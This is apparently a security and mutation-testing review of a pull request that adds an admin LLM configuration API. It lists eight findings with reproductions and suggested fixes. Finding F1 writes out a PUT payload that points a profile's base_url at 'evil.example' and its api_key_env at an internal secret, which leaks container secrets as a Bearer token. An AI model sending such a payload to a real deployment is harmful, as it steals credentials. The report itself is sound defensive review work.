# PR-3 round 1: admin API, hot swap, overrides v2

Reviewed tree: `1668203d428bcc1a278fe9cdb4e13bf4f49881dc` (commits `9dae54c7`, `1668203d` on `0645dfa`), worktree `scratchpad/wt-intel-pr3`. Invariants in scope: 1, 2, 3, 4, 8.

Probes were run from a copy of `tests/` with one extra file (`scratchpad/probe-tests/test_zz_probes.py`), mounted in place of `tests/`; the worktree was not edited except for mutations, each restored with `git checkout -- .`.

## Touch-point question

Which places does the diff reach that are not in the invariants' touch-point list?

- `app/_overrides_io.py` `read_override_payload` now accepts a tuple of schema versions. It is shared by `features_overrides`, `transcription_overrides`, `rag_overrides`, `embedding_overrides`; those still pass an int, so behaviour is unchanged for them (checked by reading every caller).
- `app/config.py` `load_settings` / new `load_llm_sources`: the listed touch point is `LLMConfig` and the profile types; the diff moves the start-up merge of the `llm` section (YAML + v1 overrides + `LLM_API_KEY`) into a function that the admin router now calls at request time. This is the path invariant 4 rides on.
- `app/main.py` vision / video-visual worker start-up gating: listed ("worker start-up gating"). The workers now start whenever the feature mode is not `"false"`, regardless of any vision profile.
- `app/routers/admin.py` `GET /admin/llm/exposure` and its `manifest.json` route: new route, reaches `policy_client.lookup_feature` and `settings.drive_mounts`. `policy_client` is listed; `drive_mounts` as the drive enumeration is not (the plan says `accessible-drives`).
- `app/routers/admin.py` `_notify_core_restart_pending` (core `POST /internal/restart-pending`) is now conditional for `/admin/llm`. Not listed; affects the restart banner only.
- Environment variables: `api_key_env` is now writable from the admin API, so the GUI can make a profile read **any** variable in the intelligence container's environment. Not listed, and this is where finding F1 comes from.

Candidates for a missing invariant: the last item (which secrets a GUI save may cause to leave the host).

## Baseline

Full suite at `1668203d`: `2921 passed, 2 skipped`.

## Mutation table

Mutation set run: `test_admin_router.py test_llm_routing.py test_llm_caller_inventory.py test_admin_manifest_parity.py test_embedding_overrides.py test_manifest_navigation.py test_config.py` (M4 and M25 also against the full suite). Tree restored after each (`git status` clean).

| id | file | mutation | want | result |
|---|---|---|---|---|
| M1 | `_overrides_io.py` | `schema not in supported` → `schema != supported[0]` (v2 ignored) | kill | killed (4) |
| M2 | `llm_overrides.py` `read_profiles` | drop the `!= PROFILES_SCHEMA_VERSION` check (v1 file yields `profiles: None`) | kill (inv 4) | killed (2) |
| M3 | `config.py` `load_llm_sources` | do not merge v1 overrides | kill (inv 4) | killed (3) |
| M4 | `config.py` `load_llm_sources` | drop the `LLM_API_KEY` env override | kill (inv 4) | killed by `test_config.py::test_llm_api_key_env_overrides_yaml` |
| M5 | `config.py` | saved `routing` not applied | kill | killed (3) |
| M6 | `llm_overrides.write_profiles` | drop `output_language` from the file | kill | killed (1) |
| M7 | `admin._reload_llm_routing` | do not call `set_routing` | kill (inv 8) | killed (2) |
| M8 | `admin._reload_llm_routing` | `!=` → `==` | kill | killed (2) |
| M9 | PUT | notify core unconditionally | kill | killed (1) |
| M10 | DELETE | notify core unconditionally | kill | **survived** (F8) |
| M11 | DELETE | skip the reload | kill (inv 8) | killed (1) |
| M12 | PUT | ignore `checked.error` | kill | killed (1) |
| M13 | PUT | validate with `environ={}` | live (environ only feeds key values) | survived, as expected |
| M14 | `_validate_llm` | drop the 16-profile cap | kill | killed (1) |
| M15 | `_validate_llm` | only `\x00` counts as a control character | kill | killed (1) |
| M16 | `_validate_llm` | drop the 2048-char length cap | kill | **survived** (F7) |
| M17 | `_llm_view` legacy | `offhost` `is not False` → `is False` | kill (inv 3) | killed (1) |
| M18 | `_llm_view` | `api_key_present` always true when a name is set | kill | killed (1) |
| M20 | `_llm_view` | `output_language_restart_pending` inverted | kill | **survived** (F8) |
| M21 | exposure | denied always `falls_back` (no `skips`) | kill | **survived** (F5) |
| M22 | exposure | `unknown` verdict reported as `sends` | kill | killed (1) |
| M23 | exposure | list drives for on-host features too | kill | killed (1) |
| M24 | exposure | no per-request verdict memo (lookup per feature × drive) | live (cost only; `policy_client` caches 30 s) | survived, as expected |
| M25 | `main.py` | restore the old start-up gate (`is_vision_describe_available` / `is_video_visual_index_available`) | kill (inv 8) | **survived the full suite** (`2921 passed`) (F6) |
| M26 | `llm_routing.set_routing` | keep the old client cache across a swap | kill (inv 8) | killed (2) |
| M27 | `config.py` | drop `offhost` from the section | kill (inv 3/4 legacy) | killed (1) |
| M29 | `_llm_view` | `legacy = False` | kill | killed (2) |
| M31 | `manifest.json` | remove the `/admin/llm/exposure` route | kill | killed (1) |
| M32 | `manifest.json` | exposure `pre_check: null` | kill | killed (8) |
| M33 | `read_profiles` | always `None` | kill | killed (3) |
| M34 | PUT | skip `_validate_llm` | kill | killed (3) |

Not mutated: "an in-flight job keeps its client" — `Resolved` holds the client object and `set_routing` builds a new `_Active`; there is no reference an in-flight job could re-read, so no single-point mutation breaks it short of rewriting `resolve`.

## Findings

### F1 — `api_key_env` lets an admin send any container environment variable to any URL [introduced] — High (security; candidate missing invariant, supervisor to bucket)

`app/llm_routing.py:208-212` (`_build_profile`) accepts any non-empty string for `api_key_env` and reads `environ.get(api_key_env)` as the profile's key; `app/llm.py:454-457` sends it as `Authorization: Bearer` to the profile's `base_url`. Until this PR the name was only settable in YAML (operator); `PUT /admin/llm` (`app/routers/admin.py:500-532`) now makes it GUI-writable, and `_validate_llm` does not restrict it.

Reproduction (`probe-tests/test_zz_probes.py::test_probe_env_exfil`): with `CORE_INTERNAL_SECRET=core-secret-xyz` in the environment, PUT
`{"profiles":{"x":{"provider":"openai_compatible","base_url":"http://evil.example/v1","model":"m","offhost":false,"api_key_env":"CORE_INTERNAL_SECRET"}},"routing":{"default":"x"}}` → 200; `current_routing().profiles["x"].config.api_key == "core-secret-xyz"`, `base_url == "http://evil.example/v1"`. The next LLM call of any feature on any drive (offhost: false passes every `llm_cloud` ceiling) carries the core's internal write secret to that host. The same works for `OPENAI_API_KEY`, `DEEPGRAM_API_KEY`, `HF_TOKEN` or anything else in the container. `GET /admin/llm` additionally reports `api_key_present` for any saved name, a set/unset oracle over the environment (minor on its own).

Who can do it: the master viewer, and **anyone on the LAN when `passwords.json` is absent or `[]`** (CLAUDE.md: then everyone is an admin). Pointing the legacy `base_url` elsewhere to leak `LLM_API_KEY` was possible before ([pre-existing], v1 GUI); reaching every other secret in the container is new. `CORE_INTERNAL_SECRET` gates `PUT /internal/files/{id}/chapters` and `restart-pending` (design-decisions "Internal API").

Suggested fix (not applied): constrain GUI-supplied `api_key_env` to a declared set — e.g. a name pattern such as `^LLM_[A-Z0-9_]*API_KEY$`, or an operator allowlist env var — and reject everything else with 400; or keep `api_key_env` YAML-only and let the GUI choose among names the YAML declares. Report `api_key_present` only for allowed names.

### F2 — GUI save of a legacy profile drops a YAML `llm.api_key` [introduced] — Medium

In legacy mode the key may come from YAML `llm.api_key` (`load_llm_sources` only overrides it when `LLM_API_KEY` is set, `app/config.py:1025-1028`; `build_routing` legacy path uses `base` unchanged). `_llm_view` (`app/routers/admin.py:449-458`) presents that profile with `api_key_env: "LLM_API_KEY"` and computes `api_key_present` from the env only. Saving it as v2 builds the profile's key from `environ["LLM_API_KEY"]` only (`llm_routing.py:215`), so the YAML key is gone.

Reproduction (`test_probe_yaml_api_key`): YAML `{provider: openai_compatible, base_url: https://api.x/v1, model: gpt, api_key: sk-yaml}`, no `LLM_API_KEY`: `base.api_key == "sk-yaml"`; GET shows `api_key_present: False`; PUT of the GET profile (minus `api_key_present`) → 200, `profiles["default"].config.api_key == ""`. Every call then fails with 401 after a save that changed nothing. The GET misreport alone is [pre-existing] (old GET also read env only, `0645dfa:app/routers/admin.py`); the loss on save is new.

Suggested fix: in the legacy view, report key presence from `base.api_key`; and either refuse the first v2 save while the key only exists in YAML (400 with "move api_key to an env var"), or document it in `known-issues.md` together with PR-1 R5-F2.

### F3 — first GUI save turns off agentic Ask on legacy installs [introduced] — Medium

Legacy `agentic` is computed from `agentic_models` (`llm_routing.py:113-118`). `_llm_view` does not include `agentic` in the legacy profile, and a v2 profile without `agentic: true` is non-agentic (`llm_routing.py:222`; gate at `rag/service.py:995`).

Reproduction (`test_probe_roundtrip_stripped_legacy_agentic`): YAML with `agentic_mode: on`, `agentic_models: [{name: qwen3:14b}]`, `model: qwen3:14b` → legacy `agentic == True`; GET → PUT of the same profile → 200, `agentic == False`. Ask silently switches to the single-turn pipeline after an unchanged save.

Suggested fix: add `"agentic": <legacy profile>.agentic` to the legacy view so a round-trip preserves it.

### F4 — GET output does not round-trip into PUT [introduced] — Low

`_llm_view` writes `api_key_present` into each profile dict (`admin.py:466-468`); PUT hands profiles to `_build_profile`, which rejects unknown keys.

Reproduction (`test_probe_roundtrip_get_put`): PUT of GET's own `profiles`/`routing`/`output_language` → `400 llm.profiles.default has unknown keys ['api_key_present']`. PR-4 must strip it on every save; one missed path and saving fails. Suggested fix: return key status in a separate map (`"key_status": {name: bool}`), or drop response-only keys before validation.

### F5 — `/admin/llm/exposure` verdicts can disagree with what `resolve` does [introduced] — Low

`get_llm_exposure` (`admin.py:552-594`) looks only at the offhost flag and the policy verdict, not at what `resolve` also checks:

- vision features: `falls_back` when the fallback has no `vision_model`, where `resolve` skips. Reproduction (`test_probe_exposure_mismatch`): `vision_describe` → offhost cloud with `vision_model`, `local_fallback: local` (no vision model), drive `b` denied → exposure `{"b": "falls_back"}`, `resolve("b", "vision_describe", vision=True)` → `Skip("profile 'local' cannot serve vision_describe")`. By reading, the same holds for `sends` when the offhost profile has no vision model or a disabled client.
- features whose mode is `"false"` are listed as sending.
- drives come from `settings.drive_mounts` (`DRIVE_MOUNTS` env), not from the core (`accessible-drives`, as the plan's PR-3 item says). A mount name the core does not know answers 404 → `denied` → shown as `falls_back`/`skips`; a drive whose intelligence addon policy is off also shows `falls_back`/`skips` although nothing runs there (by reading `_strict_verdict`; not measured against the core).
- the `skips` branch is not held by any test (M21 survived).

This is display-only and errs toward over-reporting sends, never under-reporting, so invariant 1 is not affected. Suggested fix: derive each cell by the same rules as `resolve` (reuse a pure helper taking the verdict), skip features in mode `"false"`, and add a `skips` row.

### F6 — no test holds that vision workers start without a vision profile [introduced] — Medium (test gap on invariant 8)

M25 restores the old start-up gate in `app/main.py:272` / video-visual equivalent and the full suite stays green (`2921 passed`). With that gate, an install started without any vision profile never starts the two workers; after a GUI save adds one, `is_vision_describe_available` turns true (hot routing), the routers accept jobs into a queue nobody drains, and nothing runs until restart — invariant 8 broken for vision. The code at `1668203d` is correct; the property is unguarded. Suggested fix: one lifespan test asserting both worker tasks exist when the feature mode is not `"false"` and no profile has a vision model.

Related, not a defect of this PR: with `vision_describe: on_index`, the start-up `enqueue_unprocessed` sweep runs only at boot, so a vision profile added from the GUI describes newly indexed images only until the next restart. Worth a line in PR-4's "applies immediately" marker.

### F7 — PUT persists values the resolver ignores, with no size bound [introduced] — Low

`_validate_llm` checks only string values of profile fields; `_build_profile` then drops wrong-typed known keys silently via `parse_llm_config` (`config.py:993-998`), and `_mapping` accepts arbitrary extra keys under `routing`. All of it is written to `llm-overrides.json` and echoed back by GET.

Reproduction (`test_probe_routing_junk_and_nonstring`, `test_probe_nonstring_effect`): `routing.junk = "A"*3_000_000` → 200, file 3,000,563 bytes; `model: ["x"]`, `temperature: "hot"` → 200, effective `model == ""`, `temperature == 0.3`, while GET shows the list and `"hot"` (the GUI would display a value that is not in effect). `max_tokens: -5` accepted. The 2048-char cap itself has no test (M16 survived). Tab and ESC in strings are accepted (JSON-escaped on disk, harmless). `api_key` in a profile, an offhost `local_fallback` and a non-bool `offhost` are all rejected (checked).

Suggested fix: in `_build_profile`, reject known keys of the wrong type instead of ignoring them; reject unknown keys under `routing`; bound the request body; add a length-cap row to `test_llm_put_rejects_and_changes_nothing`.

### F8 — restart signalling is partly unguarded; a reverted change leaves the banner up [introduced] — Low

- M10 (DELETE notifies unconditionally) and M20 (`output_language_restart_pending` inverted) survive: neither the DELETE notify gate nor the GET flag is held by a test.
- PUT `output_language` A→B raises the core sentinel; a second PUT back to the start-up value returns `restart_required: false` and does not clear it (the core has no clear call), so the banner stays while GET says nothing is pending. A lost notify (`core_notified: "error"`) is recoverable from `output_language_restart_pending` in GET. Both are B; the banner case goes away on the next restart.

Suggested fix: a DELETE row and a GET-flag assertion in the existing restart tests. No code change needed for the revert case unless PR-4 wants the banner to follow the GET flag.

## Checked, no finding

- Invariant 4 on upgrade: `load_settings` now calls `load_llm_sources`, which performs the same YAML + v1 merge + `LLM_API_KEY` override as before (diffed line by line; M1–M4 killed). A v1 file's `output_language` still applies through `read_overrides` → `merge_into_dict`. A v2 file carries only `profiles`/`routing`/`output_language`, so `_from_raw` picks up nothing else from it.
- Rollback: an image at `0645dfa` reads a v2 file as "unknown schema_version 2", ignores it and runs on the YAML (legacy profile, offhost unless declared, still gated by `llm_cloud`). The provider may change silently on rollback, but invariant 1 holds.
- Invariant 8 settings identity: `_current()` rebuilds from `config.settings.llm_section` (start-up snapshot) whenever `_active.settings is not config.settings`. Nothing in `app/` outside tests reassigns `config.settings` (grep), and routers/workers pass the same module-level object to `has_vision_profile`, so a saved routing is not reverted by a stale rebuild in production. The trap remains: any future `config.settings = load_settings()` reload would silently revert GUI routing to the start-up snapshot, not to disk.
- `/status` (`main.py:437-444`) and `has_vision_profile` read `_current()` and follow a swap; `output_language` stays start-up-bound by design (decision 10).
- `base_url` pointing at internal hosts (SSRF from the LLM client) was already possible through the v1 GUI [pre-existing].
- Old clients dropped by a swap are not closed; they are released when the last in-flight job drops its `Resolved`.

TOTAL: 8 findings
